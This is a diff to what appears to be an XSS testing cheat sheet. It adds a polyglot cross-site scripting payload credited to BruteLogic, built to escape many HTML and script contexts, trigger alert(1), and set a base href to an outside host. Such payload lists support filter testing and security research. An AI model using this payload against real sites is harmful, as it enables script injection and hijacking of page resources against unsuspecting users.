@@ -22,6 +22,11 @@ circumvent the defense mechanism.
  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~XSSfilterteststring
 ```
 
+- Best XSS PolyGlot (Credit: BruteLogic):
+```
+JavaScript://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/</Style/</Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus= /*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+```
+
 ## 𝐂𝐨𝐦𝐦𝐨𝐧 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐨𝐬𝐢𝐭𝐢𝐨𝐧𝐬
 
 
